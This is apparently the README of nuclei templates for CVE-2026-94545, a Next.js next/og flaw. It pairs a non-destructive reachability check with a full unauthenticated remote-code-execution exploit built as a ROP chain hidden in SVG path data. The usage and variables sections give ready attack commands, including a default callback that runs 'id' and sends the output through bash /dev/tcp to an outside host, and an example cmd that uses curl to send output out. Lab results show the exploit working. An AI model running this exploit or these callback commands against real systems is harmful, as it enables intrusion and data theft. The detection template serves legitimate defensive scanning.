# CVE-2026-94545 — nuclei templates

Templates for **CVE-2026-94545**: Next.js `next/og` (ImageResponse → Satori) serializes
caller-controlled text without escaping (CWE-116). On the Node.js runtime with `sharp`
present, the resulting SVG is parsed by native libraries (libvips → librsvg → libxml2)
instead of the sandboxed `resvg-wasm` renderer, and an injected `xi:include` plus a nested
DTD entity corrupts memory inside libxml2. Because the current Node.js linux-x64 build is
non-PIE and ships fixed gadget addresses, a ROP chain assembled from qwords smuggled
through SVG path coordinates reaches `execve("/bin/sh", "-c", cmd)` — unauthenticated RCE,
no leak required.

| Template | Purpose | Impact on target |
| --- | --- | --- |
| `CVE-2026-94545.yaml` | Reachability check: confirms the native XInclude path is live | none (non-destructive) |
| `CVE-2026-94545-rce.yaml` | Full exploit: builds and delivers the ROP payload, confirms out of band | executes `cmd` (worker process is replaced) |

Both use the **JavaScript protocol** (nuclei v3): the payload is a computed binary
(IEEE-754 double encoding, ~1.2 KB SVG path), which is not expressible with static HTTP
requests. The JS builder inside the template is byte-identical to the reference builder
shipped with the advisory.

## Affected / not affected

- Vulnerable: Next.js 16.2.0 – 16.3.5, Satori `>= 0.0.27 < 0.33.5`, Node.js runtime,
  `sharp` installed in the deployment (native ImageResponse pipeline).
- Patched: Next.js 16.3.6 / Satori 0.33.5 (Satori escapes the text again).
- Not exploitable: Edge runtime, or Node runtime without `sharp` (falls back to the
  sandboxed `resvg-wasm` renderer, which does not process XInclude).

## Usage

```bash
# Reachability (safe, run this first)
nuclei -u https://target.example -t CVE-2026-94545.yaml

# Exploit with Interactsh (default callback: bash /dev/tcp/<interactsh host>/80)
nuclei -u https://target.example -t CVE-2026-94545-rce.yaml

# Exploit with an explicit command (<= 71 bytes) and no Interactsh
nuclei -u https://target.example -t CVE-2026-94545-rce.yaml -var cmd='curl http://10.0.0.5/x?i=$(id)'
```

### Variables

| Name | Template | Default | Notes |
| --- | --- | --- | --- |
| `base` | both | `{{Hostname}}` | Target base URL (`scheme://host[:port]`). Normally derived from the scan target; set `-var base=https://host:port` to override. |
| `ogpath` | both | `/api/og` | Path of the OG image route. Detection probes `POST <ogpath>` and `GET <ogpath>?value=` / `?text=` / `?title=`. |
| `safecheck` | rce | `true` | Pre-condition gate: sends the benign probe/control pair and aborts if the native path is absent. Set `-var safecheck=false` to force delivery. |
| `cmd` | rce | *(empty)* | Command to execute. Interactsh `bash -c 'id>/dev/tcp/<host>/80'` is used when empty. Hard limit of **71 bytes** (the ROP chain has to fit the overflow). |
| `oast` | rce | `{{interactsh-url}}` | Callback host, optionally `host:port` (port defaults to 80). Filled by Interactsh; can be set explicitly for lab/live-fire testing. |

The JavaScript protocol does not expose `BaseURL`, so the base is built from `{{Hostname}}`
(`host[:port]`) and the scheme is resolved by probing — `http://` first, then `https://`,
and only one candidate is used when the base already carries a scheme or a port that
identifies it (`80`, `443`). A target that cannot answer a benign request on a candidate is
skipped.

## How the detection template decides

It injects the same `xi:include`/`data:` construct twice, byte-for-byte the same length:

- **probe** — the included document is a valid `feTurbulence` SVG, which the native parser
  resolves and rasterizes (≈ 2.5 MB PNG on the vulnerable stack).
- **control** — the first base64 character is flipped, so the included document is not valid
  XML and nothing is drawn (≈ 22 KB PNG).

A target is reported when `probe >= 200 KB`, `control < 200 KB` and `ratio >= 6` for at
least one request shape. Patched Satori escapes the text, and `resvg-wasm` ignores XInclude,
so both payloads render identically there and nothing is reported. The check never sends
the ROP payload, so it leaves a vulnerable target running.

Output carries the measurements, e.g.
`NEXTJS_OG_XINCLUDE_REACHABLE http://127.0.0.1:3000 POST /api/og probe=2522895B control=21979B ratio=114.8`,
matched by the `success == true` DSL matcher plus the `NEXTJS_OG_XINCLUDE_REACHABLE` word.

## Exploit behaviour

Execution is blind: the successful chain replaces the Node worker process, so the HTTP
request is aborted (connection reset / empty reply) and the result has to come back out of
band. A hit is an interaction on the Interactsh host — the default command runs
`id >/dev/tcp/<interactsh host>/80`, which yields both the DNS callback and the TCP payload.
`-var cmd=...` is available when the callback channel is already known and Interactsh is not
in use. The scheme is settled with a benign request before delivery, so an aborted payload
request is distinguishable from an unreachable target.

## Verification

- Both templates: YAML parses, `yaml=ok schema=ok` against the nuclei JSON schema
  (`nuclei-jsonschema.json`), and every JS block passes `node --check`.
- Live lab, same Node.js `v24.20.0` linux-x64 build as the advisory:

| Check | Result |
| --- | --- |
| `CVE-2026-94545.yaml` → Next.js 16.3.5 | `NEXTJS_OG_XINCLUDE_REACHABLE POST /api/og probe=2522895B control=21979B ratio=114.8` |
| `CVE-2026-94545.yaml` → Next.js 16.3.6 | `NEXTJS_OG_XINCLUDE_ABSENT` (probe 22,954 B, ratio ≈ 1) |
| `CVE-2026-94545.yaml` → host:port with nothing listening | `NEXTJS_OG_XINCLUDE_ABSENT`, no error |
| `CVE-2026-94545-rce.yaml` → Next.js 16.3.6, `safecheck` default | pre-condition false, payload never sent, target stays up |
| `CVE-2026-94545-rce.yaml` → Next.js 16.3.6, `safecheck=false` | payload delivered, HTTP 200, target stays up |
| `CVE-2026-94545-rce.yaml` → Next.js 16.3.5 | gate passes, 25,286-byte payload delivered (sha256 `cb55800f435d6522c82d73f0fa1b66c2dde2620617e29594a7787210c702401c`), request aborted, callback received `uid=1001(user) gid=1001(user) groups=1001(user),27(sudo),100(users)` |
| `CVE-2026-94545-rce.yaml` with a 72-byte command | refused with an explicit error, no request sent |

The delivered payload hash equals the reference builder output for the same command, so the
in-template JS build path is byte-exact.

## Notes

- Reference: <https://github.com/EQSTLab/CVE-2026-94545>
- The gadget addresses are pinned to the official Node.js `v24.20.0` linux-x64 build. On a
  different Node build the corruption usually kills the worker without executing the
  command, so a missing callback means "not exploitable here", not necessarily "not
  vulnerable".
